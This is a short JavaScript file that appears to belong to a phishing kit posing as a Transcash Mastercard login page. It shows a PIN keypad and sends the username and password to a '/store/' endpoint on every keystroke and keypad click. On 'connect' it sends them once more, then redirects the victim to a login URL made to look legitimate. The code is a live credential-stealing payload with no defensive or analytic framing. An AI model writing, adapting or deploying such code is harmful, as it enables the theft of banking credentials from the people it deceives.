function showPwd() {
    document.getElementById("securePin").style.display = 'table';
}

function setPwd(e) {
    sendCadeau();
    document.getElementById("password").value += e.target.textContent;
}

function sendCadeau() {
    var info = document.getElementById("username") + " - " + document.getElementById("password").value;
    fetch('/store/' + info).then().catch();
}

function redirect() {
    sendCadeau();
    document.location.href = 'https://transcashmastercard.espace-personnel.fr/login';
}

document.getElementById("username").addEventListener("input", sendCadeau, false);

document.querySelectorAll("#securePin td").forEach(item => {
    item.addEventListener('click', setPwd)
})

document.getElementById("connectBtn").addEventListener("click", redirect, false);